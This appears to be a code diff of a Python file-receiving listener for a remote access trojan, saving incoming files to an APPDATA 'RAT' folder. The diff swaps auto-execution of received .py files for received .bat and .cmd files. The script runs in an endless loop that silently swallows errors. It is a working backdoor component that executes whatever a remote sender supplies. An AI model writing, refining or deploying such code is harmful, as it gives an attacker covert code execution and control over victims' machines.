@@ -1,19 +1,21 @@
 import socket
 import tqdm
 import os
+
 # device's IP address
 
-SERVER_HOST = "0.0.0.0"
+SERVER_HOST = "127.0.0.1"
 SERVER_PORT = 8022
 # receive 4096 bytes each time
 BUFFER_SIZE = 4096
 SEPARATOR = "<SEPARATOR>"
 
 
-path = os.path.join(os.getenv('APPDATA'), "RAT")
+path = os.path.join(os.getenv("APPDATA"), "RAT")
 
 if not os.path.isdir(path):
     os.mkdir(path)
+
 
 def main():
 
@@ -29,9 +31,9 @@ def main():
     print(f"[*] Listening as {SERVER_HOST}:{SERVER_PORT}")
 
     # accept connection if there is any
-    client_socket, address = s.accept() 
+    client_socket, address = s.accept()
     # if below code is executed, that means the sender is connected
-    print(f"[+] {address} is connected.")
+    print(f"[+] {address} connected.")
 
     # receive the file infos
     # receive using client socket, not server socket
@@ -44,7 +46,13 @@ def main():
 
     # start receiving the file from the socket
     # and writing to the file stream
-    progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
+    progress = tqdm.tqdm(
+        range(filesize),
+        f"Receiving {filename}",
+        unit="B",
+        unit_scale=True,
+        unit_divisor=1024,
+    )
     file_path = os.path.join(path, filename)
     with open(file_path, "wb") as f:
         while True:
@@ -58,22 +66,18 @@ def main():
             f.write(bytes_read)
             # update the progress bar
             progress.update(len(bytes_read))
-            
-    if filename.endswith('.py'):
-        print(filename)
-        os.system(f'python "{file_path}" ')
 
-
+    if filename.endswith(".bat") or filename.endswith(".cmd"):
+        os.system(f'"{file_path}"')
 
     # close the client socket
     client_socket.close()
     # close the server socket
     s.close()
 
+
 while True:
     try:
         main()
     except:
         ...
-    
-
